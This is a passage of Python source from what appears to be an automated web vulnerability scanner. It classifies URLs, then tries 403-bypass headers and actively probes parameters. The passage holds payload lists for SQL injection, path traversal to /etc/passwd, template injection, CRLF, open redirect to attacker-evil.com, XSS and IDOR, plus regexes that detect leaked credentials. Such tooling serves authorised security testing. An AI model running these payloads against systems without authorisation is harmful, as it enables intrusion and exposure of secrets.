    urls=sorted({u for u in urls if u.startswith("http") and in_target_domain(u, domain)})
    save_txt(f"{out}/urls.txt",urls)
    ok(f"Final URLs   : {BOLD}{len(urls)}{RESET}")
    _end()
    return urls

# ══════════════════════════════════════════════════════════════════════════════
#  5. SMART URL CLASSIFIER + PROBE  (baseline-aware false positive filter)
# ══════════════════════════════════════════════════════════════════════════════

BUCKETS={
    "Admin / Dashboard":  re.compile(r"/(admin|administrator|dashboard|manage|console|cpanel|wp-admin|phpmyadmin|backend|portal)(/|\?|\.php|$)",re.I),
    "Login / Auth":       re.compile(r"/(login|signin|sign-in|authenticate|auth|sso|oauth|saml|account/login)(/|\?|$)",re.I),
    "API Endpoints":      re.compile(r"/(api/v\d|graphql|rest/|/v\d+/|swagger|openapi\.json|api-docs|_api/)(/|\?|$)",re.I),
    "File Upload":        re.compile(r"/(upload|file-upload|import|attach|media/upload|document/upload)(/|\?|$)",re.I),
    "Sensitive Files":    re.compile(r"\.(bak|sql|backup|config|conf|env|log|dump|db|sqlite|zip|pem|key|old|orig|tmp)(\?.*)?$",re.I),
    "Cloud Storage":      re.compile(r"(s3\.amazonaws|storage\.googleapis|blob\.core\.windows|digitaloceanspaces|r2\.cloudflarestorage)",re.I),
    "SSRF / Redirect":    re.compile(r"[?&](url|redirect|return|next|dest|uri|path|to|target|link|out)=https?://",re.I),
    "Open Redirect":      re.compile(r"[?&](redirect|return_url|returnto|goto|dest|url)=[^&]{1,200}",re.I),
    "SQLi Candidates":    re.compile(r"[?&](id|item_id|product_id|user_id|order_id|cat|category_id|page_id|post_id|pid|nid)=\d+",re.I),
    "LFI Candidates":     re.compile(r"[?&](file|page|lang|language|template|include|path|dir|folder|document|load|read|view)=",re.I),
    "Debug / Dev":        re.compile(r"/(debug|test|dev|staging|phpinfo\.php|info\.php|server-status|\.git/|\.env|\.svn/)",re.I),
    "Password Reset":     re.compile(r"/(forgot|reset-password|password-reset|recover|change-password)(/|\?|$)",re.I),
    "User Profile":       re.compile(r"/(user|profile|account|member|me)(/\d+|/edit|/settings|$)",re.I),
}

SENSITIVE_URL_RE=re.compile(
    r"(\.(env|json|yml|yaml|xml|conf|config|cfg|ini|bak|sql|log|key|pem|db|sqlite)"
    r"|/\.git/|/\.svn/|/wp-config|/settings\.py|/appsettings"
    r"|/api-docs|/swagger|/openapi|/phpinfo|/server-status)(\?.*)?$",re.I)

# 403 bypass techniques
BYPASS_HEADERS=[
    ("X-Original-URL",          "/{path}",    "X-Orig-URL"),
    ("X-Rewrite-URL",           "/{path}",    "X-Rewrite"),
    ("X-Forwarded-For",         "127.0.0.1",  "XFF:127"),
    ("X-Real-IP",               "127.0.0.1",  "X-Real-IP"),
    ("X-Custom-IP-Authorization","127.0.0.1", "X-CustomIP"),
    ("X-Originating-IP",        "127.0.0.1",  "X-Orig-IP"),
    ("Referer",                 "https://127.0.0.1/","Ref:127"),
    ("X-Host",                  "localhost",   "X-Host"),
]
BYPASS_PATHS=[
    ("{url}//",         "double-slash"),
    ("{url}/%2f",       "url-encode-slash"),
    ("{url}/.;/",       "dot-semicolon"),
    ("{url}/%20",       "space-encode"),
    ("{url}%09",        "tab-encode"),
    ("{url}?any",       "junk-param"),
    ("{base}/%2e/{leaf}","dot-encode"),
]

def try_403_bypass(url):
    parsed=urllib.parse.urlparse(url)
    path=parsed.path.lstrip("/")
    base=f"{parsed.scheme}://{parsed.netloc}"
    leaf=path.split("/")[-1] if "/" in path else path
    base_dir="/".join(path.split("/")[:-1]) if "/" in path else ""
    results=[]

    def probe(test_url, extra_hdrs):
        req=urllib.request.Request(test_url,headers={"User-Agent":UA,"Accept":"*/*"})
        for k,v in extra_hdrs: req.add_header(k,v)
        try:
            with urllib.request.urlopen(req,timeout=5,context=_ctx()) as r:
                return r.status,len(r.read(256))
        except urllib.error.HTTPError as e:
            return e.code,0
        except Exception:
            return 0,0

    for hk,hv_tpl,tag in BYPASS_HEADERS:
        hv=hv_tpl.replace("{path}","/"+path)
        c2,sz=probe(url,[(hk,hv)])
        if c2 and c2 not in (403,0):
            results.append({"technique":tag,"code":c2})

    for tpl,tag in BYPASS_PATHS:
        test=(tpl.replace("{url}",url)
               .replace("{base}",base+"/"+base_dir)
               .replace("{leaf}",leaf))
        c2,sz=probe(test,[])
        if c2 and c2 not in (403,0):
            results.append({"technique":tag,"code":c2})

    return results

# ── Sensitive file keywords — دليل على محتوى حقيقي مش 404 مزيف ──────────────
# لو واحدة من هذه الكلمات موجودة في الـ body → confirmed real exposure
SENSITIVE_KEYWORDS = re.compile(
    r"DB_PASSWORD|DB_HOST|DB_USER|DATABASE_URL|SECRET_KEY|APP_KEY|API_KEY"
    r"|AWS_SECRET|AWS_ACCESS|PRIVATE_KEY"
    r"|password\s*=|passwd\s*=|pwd\s*=|secret\s*="
    r"|mysql://|postgres://|mongodb://|redis://|smtp://"
    r"|-{5}BEGIN|AKIA[0-9A-Z]{16}"
    r"|root:[x*]:0:0|bin/bash"
    r"|access_token|refresh_token|client_secret"
    r"|DB_NAME|DB_PASS|APP_SECRET|JWT_SECRET",
    re.I
)

# HTML tags في بداية الـ response = صفحة HTML مش ملف حساس
HTML_START_RE = re.compile(r"^\s*(<\?xml|<!doctype|<html|<head|<body|<!--|<\!)",re.I)

def validate_200(url, body, ct, size, baseline):
    """
    هل هذه الـ 200 حقيقية أم false positive؟
    تُطبّق 4 فحوصات بالترتيب — ترجع (is_real, reason)
    """
    is_sens = bool(SENSITIVE_URL_RE.search(url))
    soft_404 = baseline.get("soft_404", False)

    # ─── فحص 1: Content-Type HTML على ملف حساس ──────────────────────────────
    if is_sens and "text/html" in ct:
        if HTML_START_RE.search(body[:200]):
            return False, "html-content-type"

    # ─── فحص 2: Soft-404 size comparison (10% threshold) ────────────────────
    if soft_404:
        baseline_size = baseline.get("soft_404_size", 0)
        threshold     = baseline.get("soft_404_threshold", 150)
        if baseline_size > 0 and abs(size - baseline_size) <= threshold:
            return False, f"size-match-baseline (|{size}-{baseline_size}|≤{threshold})"

    # ─── فحص 3: MD5 hash يطابق أحد الـ fake responses ──────────────────────
    if soft_404:
        body_hash = hashlib.md5(body.encode()).hexdigest()
        if body_hash in baseline.get("soft_404_hashes", []):
            return False, "hash-match-baseline"

    # ─── فحص 4: Body snippet يشبه الـ fake responses ──────────────────────
    if soft_404:
        clean_body = re.sub(r"<[^>]+>", "", body).strip()[:100].lower()
        for snip in baseline.get("soft_404_snippets", []):
            if snip and len(snip) > 20 and snip in clean_body:
                return False, "snippet-match-baseline"

    # ─── فحص 5: ملف حساس يجب أن يحتوي على keywords حقيقية ────────────────
    if is_sens and "text/html" not in ct:
        if not SENSITIVE_KEYWORDS.search(body[:8192]):
            # الملف موجود لكن فارغ أو لا يحتوي بيانات حساسة
            return False, "no-sensitive-keywords"

    # اجتاز كل الفحوصات → real
    return True, "validated"


def classify_and_probe(urls, baselines, out):
    section(5,"URL CLASSIFIER  +  STATUS PROBE  (validated)")

    # baselines مفهرسة per-host — يتم استدعاؤها داخل probe()
    soft_404_count = sum(1 for bl in baselines.values() if bl.get("soft_404"))
    if soft_404_count:
        info(f"Soft-404 active on {soft_404_count} host(s) — per-host baseline in effect")

    classified=defaultdict(list)
    for u in urls:
        for label,pat in BUCKETS.items():
            if pat.search(u):
                classified[label].append(u); break

    targets=[]
    for label,items in classified.items():
        seen=set()
        for u in items:
            try:
                p=urllib.parse.urlparse(u).path
                if p not in seen: seen.add(p); targets.append((label,u))
            except Exception:
                targets.append((label,u))

    info(f"Probing {len(targets)} URLs ...")
    print(GRY+"│"+RESET)

    def probe(label_url):
        label,url=label_url
        code,body,hdrs,ms=http_probe(url,timeout=8)
        if code == 404:
            return label, url, 0, "", ms, []
        redir=hdrs.get("Location","")
        ct=hdrs.get("Content-Type","").lower()
        size=len(body)

        # ── Validation — per-host baseline ───────────────────────────────────
        if code == 200:
            # اختار الـ baseline الخاص بهذا الـ host
            try:
                host = urllib.parse.urlparse(url).netloc
                host_bl = baselines.get(host) or baselines.get(
                    next(iter(baselines)), {})
            except Exception:
                host_bl = next(iter(baselines.values()), {})
            is_real, reason = validate_200(url, body, ct, size, host_bl)
            if not is_real:
                return label, url, 0, redir, ms, []

        bypass=[]
        if code==403:
            bypass=try_403_bypass(url)
            if bypass: found(f"403 bypass → {url}")

        return label,url,code,redir,ms,bypass

    filtered_count = 0
    results=defaultdict(list)
    with ThreadPoolExecutor(max_workers=pool_workers(30)) as ex:
        fmap={ex.submit(probe,t):t for t in targets}
        for f in as_completed(fmap):
            try:
                label,url,code,redir,ms,bypass=f.result(timeout=20)
                if code==0:
                    filtered_count += 1
                    continue
                results[label].append((url,code,redir,ms,bypass))
            except Exception as e:
                logger.debug(f"Classify probe failed: {e}")
    if filtered_count:
        info(f"False positives filtered: {filtered_count} URLs (soft-404/HTML/no-keywords)")

    full={}
    for label in BUCKETS:
        items=results.get(label,[])
        if not items: continue
        # فلتر 404 من العرض — لا نعرض إلا النتائج المفيدة
        items = [(u,c,r,m,b) for u,c,r,m,b in items if c != 404]
        if not items: continue
        items.sort(key=lambda x: x[1] not in (200,403,401,500))
        print(GRY+"│  "+RESET+YLW+BOLD+f"[{label}]"+RESET+GRY+f"  ({len(items)})"+RESET)
        for url,code,redir,ms,bypass in items:
            ms_s=GRY+DIM+f"  {ms}ms"+RESET if ms else ""
            rd_s=GRY+DIM+f"  → {redir[:50]}"+RESET if redir and code in(301,302) else ""
            print(GRY+"│    "+RESET+sbadge(code)+"  "+WHT+url+RESET+ms_s+rd_s)
            for bp in bypass:
                bc=bp["code"]; tag=bp["technique"]
                col=GRN+BOLD if bc==200 else YLW
                print(GRY+"│         "+RESET+col+f"↳ [{tag}] {sbadge(bc)}"+RESET)
        print(GRY+"│"+RESET)
        full[label]=[{"url":u,"status":c,"redirect":r,"ms":m,"bypass":b}
                     for u,c,r,m,b in items]

    save_json(f"{out}/classified_urls.json",full)
    v200=sum(1 for v in full.values() for i in v if i["status"]==200)
    ok(f"Interesting URLs : {BOLD}{sum(len(v) for v in full.values())}{RESET}  "
       f"({BOLD}{v200}{RESET} validated 200)")
    _end()
    return full


# ══════════════════════════════════════════════════════════════════════════════
#  5b. ACTIVE PARAMETER TESTING
#      SQLi error-based, LFI path traversal, CORS, Host Header Injection
#      كل فحص يستخدم baseline comparison لتجنب false positives
# ══════════════════════════════════════════════════════════════════════════════

# SQLi payloads مرتبة من أقل إلى أكثر وضوحاً
SQLI_PAYLOADS = [
    ("'",             "quote",       "error"),
    ("''",            "double-quote","error"),
    ("1 AND 1=1",     "bool-true",   "boolean"),
    ("1 AND 1=2",     "bool-false",  "boolean"),
    ("1'--",          "comment",     "error"),
    # Time-based — قواعد بيانات مختلفة
    ("1 AND SLEEP(5)","sleep-mysql", "time"),
    ("1; SELECT pg_sleep(5)--","sleep-pgsql","time"),
    ("1 AND 1=1 WAITFOR DELAY '0:0:5'--","sleep-mssql","time"),
    ("1 OR SLEEP(5)","sleep-or",    "time"),
]
# Minimum ms response to consider time-based confirmed (4.5s)
TIME_SQLI_THRESHOLD_MS = 4500

# أخطاء SQL الشائعة
SQLI_ERRORS = re.compile(
    r"(sql syntax|mysql_fetch|pg_query|ORA-\d{4,}|SQLite.*error"
    r"|you have an error in your sql|unclosed quotation mark"
    r"|quoted string not properly terminated|syntax error.*sql"
    r"|Microsoft OLE DB|ODBC.*Driver|Warning.*mysql_"
    r"|supplied argument is not a valid MySQL|Column count doesn't match)",
    re.I
)

# LFI payloads
LFI_PAYLOADS = [
    ("../../../../etc/passwd",            "linux-classic"),
    ("....//....//....//etc/passwd",      "dot-slash-bypass"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "double-encode"),
    ("php://filter/convert.base64-encode/resource=../config", "php-filter"),
    ("php://filter/convert.base64-encode/resource=../../config","php-filter-2"),
]
LFI_HITS = re.compile(r"root:[x*]:0:0|bin/bash|bin/sh|\[boot loader\]|base64,[A-Za-z0-9+/]{50,}",re.I)

def active_param_test(classified, baselines, waf_detected, waf_delay, out):
    """
    يختبر SQLi / LFI / SSTI / CRLF / Open Redirect / XSS / IDOR بشكل فعلي.
    يستخدم baseline comparison لفلترة false positives.
    """
    section_title = "ACTIVE PARAM TESTING  (SQLi · LFI · SSTI · CRLF · Redirect · XSS · IDOR)"
    print()
    print(GRY+"┌─ "+RESET+WHT+BOLD+"STEP 5b"+RESET+GRY+" ─── "+RESET+CYN+BOLD+section_title+RESET)
    print(GRY+"│"+RESET)

    findings = []

    def _median(vals):
        if not vals:
            return 0
        s = sorted(vals)
        return s[len(s)//2]
    # per-url baseline lookup helper
    def _get_bl(url):
        try:
            h = urllib.parse.urlparse(url).netloc
            return baselines.get(h) or next(iter(baselines.values()), {})
        except Exception:
            return {}

    def _waf_sleep():
        if waf_delay > 0:
            RATE_LIMITER.delay = max(RATE_LIMITER.delay, waf_delay)
        RATE_LIMITER.wait()

    # جمع الـ candidates
    sqli_urls = [i["url"] for i in classified.get("SQLi Candidates",[]) if i.get("status")==200]
    lfi_urls  = [i["url"] for i in classified.get("LFI Candidates",[])  if i.get("status")==200]
    redir_urls= [i["url"] for i in classified.get("Open Redirect",[])   if i.get("status") in (200,301,302)]

    # جمع URLs بها parameters — للـ SSTI و CRLF و XSS
    param_urls = set()
    for label, items in classified.items():
        for item in items:
            u = item.get("url","")
            if "?" in u and item.get("status") in (200, 301, 302):
                param_urls.add(u)
    param_urls = sorted(param_urls)[:30]

    # IDOR candidates: URLs فيها integer IDs
    idor_urls = [i["url"] for i in classified.get("SQLi Candidates",[]) if i.get("status")==200]
    idor_urls += [i["url"] for i in classified.get("User Profile",[]) if i.get("status")==200]

    if not sqli_urls and not lfi_urls and not param_urls and not redir_urls and not idor_urls:
        info("No candidates to actively test")
        print(GRY+"└"+"─"*70+RESET)
        return findings

    # ── SQLi testing ─────────────────────────────────────────────────────────
    if sqli_urls:
        info(f"SQLi — testing {len(sqli_urls)} candidates ...")
        print(GRY+"│"+RESET)

        for url in sqli_urls[:20]:   # max 20 لتجنب الحظر
            _waf_sleep()
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params: continue

            # baseline لهذا الـ URL
            base_code, base_body, _, _ = http_probe(url, timeout=8)
            if base_code != 200: continue
            base_size = len(base_body)
            base_hash = hashlib.md5(base_body.encode()).hexdigest()

            for param in list(params.keys())[:5]:   # أول 5 params
                confirmed = False
                for payload, tag, ptype in SQLI_PAYLOADS:
                    # بناء URL مع الـ payload
                    test_params = dict(params)
                    orig_val = test_params[param][0]
                    test_params[param] = [orig_val + payload]
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url  = parsed._replace(query=new_query).geturl()

                    # timeout يتكيف: time-based يحتاج أطول
                    probe_timeout = 12 if ptype == "time" else 8
                    code2, body2, _, ms2 = http_probe(test_url, timeout=probe_timeout)
                    _waf_sleep()

                    # ── Error-based ──────────────────────────────────────────
                    if ptype == "error" and SQLI_ERRORS.search(body2):
                        m = SQLI_ERRORS.search(body2)
                        if m and not SQLI_ERRORS.search(base_body):
                            vuln(f"SQLi ERROR-BASED: {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                            print(GRY+"│    "+RESET+RED+f"evidence: {m.group(0)[:80]}"+RESET)
                            findings.append({"type":"SQLi","url":url,"param":param,
                                             "payload":payload,"evidence":m.group(0)[:120],
                                             "method":"error-based"})
                            confirmed = True; break

                    # ── Boolean-based ────────────────────────────────────────
                    if ptype == "boolean" and tag == "bool-false" and not confirmed:
                        true_sizes=[]; false_sizes=[]
                        for _ in range(3):
                            tp = dict(params)
                            tp[param] = [orig_val + "1 AND 1=1"]
                            true_url  = parsed._replace(query=urllib.parse.urlencode(tp,doseq=True)).geturl()
                            _, bt, _, _ = http_probe(true_url, timeout=8)
                            true_sizes.append(len(bt))

                            fp = dict(params)
                            fp[param] = [orig_val + "1 AND 1=2"]
                            false_url = parsed._replace(query=urllib.parse.urlencode(fp,doseq=True)).geturl()
                            _, bf, _, _ = http_probe(false_url, timeout=8)
                            false_sizes.append(len(bf))

                        tmed = _median(true_sizes)
                        fmed = _median(false_sizes)
                        tvar = (max(true_sizes)-min(true_sizes)) if true_sizes else 0
                        fvar = (max(false_sizes)-min(false_sizes)) if false_sizes else 0

                        if abs(tmed-fmed) > 250 and tvar < 120 and fvar < 120:
                            vuln(f"SQLi BOOLEAN-BASED: {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}  "
                                  f"true={tmed}b  false={fmed}b"+RESET)
                            findings.append({"type":"SQLi","url":url,"param":param,
                                             "method":"boolean-based",
                                             "size_diff":abs(tmed-fmed)})
                            confirmed = True; break

                    # ── Time-based ───────────────────────────────────────────
                    if ptype == "time" and not confirmed:
                        if ms2 >= TIME_SQLI_THRESHOLD_MS:
                            _, _, _, ms_base = http_probe(url, timeout=8)
                            zparams = dict(params)
                            zparams[param] = [orig_val + "1 AND SLEEP(0)"]
                            zurl = parsed._replace(query=urllib.parse.urlencode(zparams, doseq=True)).geturl()
                            _, _, _, ms_zero = http_probe(zurl, timeout=8)
                            if (ms2 - ms_zero) >= 4000 and ms2 > max(ms_base * 3, 1000):
                                vuln(f"SQLi TIME-BASED: {url}")
                                print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                                print(GRY+"│    "+RESET+RED+
                                      f"delay: {ms2}ms  (base: {ms_base}ms  zero: {ms_zero}ms)"+RESET)
                                findings.append({"type":"SQLi","url":url,"param":param,
                                                  "payload":payload,"method":"time-based",
                                                  "delay_ms":ms2,"baseline_ms":ms_base,
                                                  "sleep0_ms":ms_zero})
                                confirmed = True; break

                if not confirmed:
                    info(f"SQLi: {url[:60]} — not vulnerable")

    # ── LFI testing ──────────────────────────────────────────────────────────
    if lfi_urls:
        print(GRY+"│"+RESET)
        info(f"LFI — testing {len(lfi_urls)} candidates ...")
        print(GRY+"│"+RESET)

        for url in lfi_urls[:15]:
            _waf_sleep()
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params: continue

            for param in list(params.keys())[:4]:
                confirmed = False
                for payload, tag in LFI_PAYLOADS:
                    test_params = dict(params)
                    test_params[param] = [payload]
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url  = parsed._replace(query=new_query).geturl()

                    code2, body2, hdrs2, ms2 = http_probe(test_url, timeout=8)
                    _waf_sleep()

                    # WAF check
                    if waf_detected and code2 in (403,406,429,503):
                        warn(f"WAF blocked LFI probe on {param} — skipping")
                        break

                    # فحص نتيجة حقيقية
                    if LFI_HITS.search(body2):
                        m2 = LFI_HITS.search(body2)
                        if m2 and not LFI_HITS.search(http_probe(url, timeout=8)[1]):
                            vuln(f"LFI CONFIRMED: {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                            print(GRY+"│    "+RESET+RED+f"evidence: {m2.group(0)[:80]}"+RESET)
                            findings.append({"type":"LFI","url":url,"param":param,
                                             "payload":payload,"evidence":m2.group(0)[:120]})
                            confirmed = True; break

                    # php://filter → base64 output
                    if "php-filter" in tag and code2==200:
                        clean = re.sub(r"<[^>]+>","",body2).strip()
                        if re.match(r"^[A-Za-z0-9+/]{40,}={0,2}$", clean[:200]):
                            vuln(f"LFI php://filter: {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}"+RESET)
                            try:
                                dec = base64.b64decode(clean[:500]).decode("utf-8",errors="ignore")
                                print(GRY+"│    "+RESET+RED+f"decoded: {dec[:100]}"+RESET)
                                findings.append({"type":"LFI-phpfilter","url":url,"param":param,
                                                 "decoded_snippet":dec[:200]})
                            except Exception as e:
                                logger.debug(f"Base64 decode failed for LFI filter: {e}")
                                findings.append({"type":"LFI-phpfilter","url":url,"param":param})
                            confirmed = True; break

                if not confirmed:
                    info(f"LFI: {url[:60]}?{param} — not vulnerable")

    # ── SSTI testing ─────────────────────────────────────────────────────────
    if param_urls:
        print(GRY+"│"+RESET)
        info(f"SSTI — testing {len(param_urls)} URLs ...")
        print(GRY+"│"+RESET)

        for url in param_urls[:20]:
            _waf_sleep()
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params: continue

            a = random.randint(111, 999)
            b = random.randint(111, 999)
            expected = str(a * b)
            SSTI_PAYLOADS = [
                (f"{{{{{a}*{b}}}}}", expected, "Jinja2/Twig"),
                (f"${{{a}*{b}}}", expected, "Freemarker/EL"),
                (f"<%={a}*{b}%>", expected, "ERB/JSP"),
                (f"{{{a}*{b}}}", expected, "Smarty"),
                (f"#{{{a}*{b}}}", expected, "Ruby/Pebble"),
            ]

            for param in list(params.keys())[:3]:
                ssti_found = False
                for payload, expected, engine in SSTI_PAYLOADS:
                    test_params = dict(params)
                    test_params[param] = [payload]
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url  = parsed._replace(query=new_query).geturl()

                    code2, body2, _, _ = http_probe(test_url, timeout=8)
                    _waf_sleep()

                    if waf_detected and code2 in (403,406,429,503):
                        break

                    # الـ payload اتنفذ → الـ expected ظهر في الـ body
                    # تحقق إن الـ expected مش موجود أصلاً في الـ URL
                    if code2 == 200 and expected in body2:
                        # Double check: هل الـ expected كان موجود قبل بدون payload؟
                        orig_code, orig_body, _, _ = http_probe(url, timeout=8)
                        if expected not in orig_body:
                            vuln(f"SSTI CONFIRMED ({engine}): {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {payload}"+RESET)
                            print(GRY+"│    "+RESET+RED+f"reflected: {expected} → template executed"+RESET)
                            findings.append({"type":"SSTI","url":url,"param":param,
                                             "payload":payload,"engine":engine,
                                             "evidence":f"{payload} → {expected}"})
                            ssti_found = True; break

                if not ssti_found and param == list(params.keys())[0]:
                    info(f"SSTI: {url[:60]} — not vulnerable")

    # ── CRLF Injection testing ───────────────────────────────────────────────
    CRLF_PAYLOADS = [
        ("%0d%0aX-Injected: bbr3c0n",        "x-injected: bbr3c0n",  "url-encode"),
        ("%0aX-Injected: bbr3c0n",            "x-injected: bbr3c0n",  "lf-only"),
        ("%E5%98%8A%E5%98%8DX-Injected: bbr3c0n","x-injected: bbr3c0n","utf8-bypass"),
        ("%23%0d%0aX-Injected: bbr3c0n",      "x-injected: bbr3c0n",  "hash-crlf"),
    ]
    if param_urls:
        print(GRY+"│"+RESET)
        info(f"CRLF Injection — testing {min(len(param_urls),15)} URLs ...")
        print(GRY+"│"+RESET)

        for url in param_urls[:15]:
            _waf_sleep()
            parsed = urllib.parse.urlparse(url)
            params_q = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params_q: continue

            for param in list(params_q.keys())[:2]:
                crlf_found = False
                for payload, needle, tag in CRLF_PAYLOADS:
                    # نحقن الـ payload في قيمة الـ parameter
                    test_params = dict(params_q)
                    orig_val = test_params[param][0]
                    # نبني الـ URL يدوياً عشان ما يعمل double-encode
                    parts=[]
                    for k,vals in params_q.items():
                        val=vals[0] if vals else ""
                        if k == param:
                            parts.append(f"{k}={val}{payload}")
                        else:
                            parts.append(f"{k}={val}")
                    raw_query="&".join(parts)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{raw_query}"

                    code2, body2, hdrs2, _ = http_probe(test_url, timeout=8,
                                                         follow_redirects=False)
                    _waf_sleep()

                    # فحص الـ headers — هل الـ injected header ظهر؟
                    for hk, hv in hdrs2.items():
                        if needle.split(":")[0].strip() in hk.lower():
                            vuln(f"CRLF INJECTION ({tag}): {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}"+RESET)
                            print(GRY+"│    "+RESET+RED+f"injected header: {hk}: {hv}"+RESET)
                            findings.append({"type":"CRLF","url":url,"param":param,
                                             "technique":tag,
                                             "evidence":f"{hk}: {hv}"})
                            crlf_found = True; break
                    if crlf_found: break

    # ── Open Redirect testing ────────────────────────────────────────────────
    REDIR_TARGETS = [
        "https://attacker-evil.com",
        "//attacker-evil.com",
        "https://attacker-evil.com/%2f..",
        "/\\attacker-evil.com",
    ]
    if redir_urls:
        print(GRY+"│"+RESET)
        info(f"Open Redirect — verifying {len(redir_urls)} candidates ...")
        print(GRY+"│"+RESET)

        for url in redir_urls[:15]:
            _waf_sleep()
            parsed = urllib.parse.urlparse(url)
            params_q = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params_q: continue

            for param in list(params_q.keys())[:3]:
                redir_found = False
                for evil_url in REDIR_TARGETS:
                    test_params = dict(params_q)
                    test_params[param] = [evil_url]
                    new_query = urllib.parse.urlencode(test_params, doseq=True)
                    test_url  = parsed._replace(query=new_query).geturl()

                    code2, body2, hdrs2, _ = http_probe(test_url, timeout=7,
                                                         follow_redirects=False)
                    _waf_sleep()

                    location = hdrs2.get("Location","").lower()
                    if code2 in (301,302,303,307,308) and "attacker-evil" in location:
                        vuln(f"OPEN REDIRECT CONFIRMED: {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {evil_url}"+RESET)
                        print(GRY+"│    "+RESET+RED+f"Location: {hdrs2.get('Location','')}"+RESET)
                        findings.append({"type":"OpenRedirect","url":url,"param":param,
                                         "payload":evil_url,
                                         "location":hdrs2.get("Location","")})
                        redir_found = True; break

                    # فحص meta refresh / javascript redirect في الـ body
                    if code2 == 200 and "attacker-evil" in body2.lower():
                        vuln(f"OPEN REDIRECT (body-based): {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  payload: {evil_url}"+RESET)
                        findings.append({"type":"OpenRedirect-body","url":url,
                                         "param":param,"payload":evil_url})
                        redir_found = True; break
                if redir_found: break

    # ── XSS Reflected Testing ───────────────────────────────────────────────
    if param_urls:
        print(GRY+"│"+RESET)
        info(f"XSS Reflected — testing {len(param_urls)} URLs ...")
        print(GRY+"│"+RESET)

        # Canary فريد لكل scan ─ يمنع false positive
        canary = f"bb{random.randint(10000,99999)}x"

        XSS_PAYLOADS = [
            (f"<{canary}>",                       f"<{canary}>",        "html-tag-unfiltered"),
            (f'"onmouseover=alert({canary})//',   f"onmouseover=",      "attr-event-handler"),
            (f"'-alert({canary})-'",              f"-alert({canary})-", "js-context-break"),
            (f"<img/src=x onerror=alert({canary})>", "onerror=",       "img-onerror"),
            (f"<svg/onload=alert({canary})>",     "onload=",            "svg-onload"),
            (f"<details open ontoggle=alert({canary})>", "ontoggle=",  "details-bypass"),
            (f"<svg onload=alert`{canary}`>",     "onload=",            "backtick-bypass"),
        ]

        def _detect_xss_context(body, reflected_value):
            idx = body.find(reflected_value)
            if idx < 0:
                return "none"
            before = body[max(0, idx-500):idx].lower()
            last_script_open = before.rfind("<script")
            last_script_close = before.rfind("</script")
            if last_script_open > last_script_close:
                return "js"
            last_quote = max(before.rfind('"'), before.rfind("'"))
            last_tag = before.rfind("<")
            if last_tag > -1 and last_quote > last_tag:
                return "attribute"
            return "html"

        for url in param_urls[:25]:
            _waf_sleep()
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                continue

            for param in list(params.keys())[:3]:
                xss_found = False
                # Step 1: Canary reflection check
                tp = dict(params)
                tp[param] = [canary]
                canary_url = parsed._replace(
                    query=urllib.parse.urlencode(tp, doseq=True)).geturl()
                code_c, body_c, _, _ = http_probe(canary_url, timeout=8)
                _waf_sleep()

                if code_c != 200 or canary not in body_c:
                    continue  # ما ينعكس — لا فايدة

                context = _detect_xss_context(body_c, canary)
                info(f"XSS: {param}@{url[:50]} — canary reflected [{context}]")

                # Step 2: يختبر payloads حسب السياق
                for payload, evidence, tag in XSS_PAYLOADS:
                    tp2 = dict(params)
                    tp2[param] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(tp2, doseq=True)).geturl()
                    code2, body2, _, _ = http_probe(test_url, timeout=8)
                    _waf_sleep()

                    if waf_detected and code2 in (403, 406, 429, 503):
                        RATE_LIMITER.report_blocked()
                        break

                    if code2 == 200 and evidence in body2:
                        # تحقق إن الـ evidence مش موجود أصلاً في الـ original
                        _, orig_body, _, _ = http_probe(url, timeout=8)
                        if evidence not in orig_body:
                            vuln(f"XSS REFLECTED ({tag}): {url}")
                            print(GRY+"│    "+RESET+CYN+f"param: {param}  context: {context}"+RESET)
                            print(GRY+"│    "+RESET+RED+f"payload: {payload[:80]}"+RESET)
                            findings.append({"type": "XSS", "url": url, "param": param,
                                             "payload": payload, "technique": tag,
                                             "context": context,
                                             "evidence": evidence[:120]})
                            xss_found = True
                            break
                    else:
                        RATE_LIMITER.report_success()

                if not xss_found and param == list(params.keys())[0]:
                    info(f"XSS: {url[:60]} — not vulnerable")

    # ── IDOR Testing ────────────────────────────────────────────────────────
    if idor_urls:
        print(GRY+"│"+RESET)
        info(f"IDOR — testing {len(idor_urls)} candidates ...")
        print(GRY+"│"+RESET)

        for url in idor_urls[:15]:
            _waf_sleep()
            parsed = urllib.parse.urlparse(url)
            params_q = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params_q:
                continue

            for param in list(params_q.keys())[:3]:
                orig_val = params_q[param][0] if params_q[param] else ""
                if not orig_val.isdigit():
                    continue

                orig_id = int(orig_val)
                code_orig, body_orig, _, _ = http_probe(url, timeout=8)
                if code_orig != 200 or len(body_orig) < 100:
                    continue
                orig_hash = hashlib.md5(body_orig.encode()).hexdigest()

                for test_id in [orig_id + 1, orig_id - 1, orig_id + 100, 1]:
                    if test_id == orig_id or test_id < 0:
                        continue
                    tp = dict(params_q)
                    tp[param] = [str(test_id)]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(tp, doseq=True)).geturl()
